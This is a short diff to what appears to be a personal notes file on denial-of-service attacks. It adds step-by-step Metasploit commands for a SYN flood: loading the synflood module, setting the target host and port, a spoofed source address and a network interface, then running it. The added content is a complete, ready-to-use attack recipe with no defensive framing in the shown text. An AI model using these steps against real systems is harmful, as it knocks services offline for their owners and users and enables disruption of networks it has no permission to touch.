@@ -18,3 +18,10 @@ When the cache cleaning is slower than the flood this attacks happen.
 # DDOS Synchronization Flood Attack
 
 1. open metasploit 
+2. use auxiliary/dos/tcp/synflood
+3. show options
+4. set RHOSTS <target_ip>
+5. set RPORT <target_port>
+6. set SHOST <middle_ip>
+7. set interface <interface_name> (in my case wln0)
+8. run
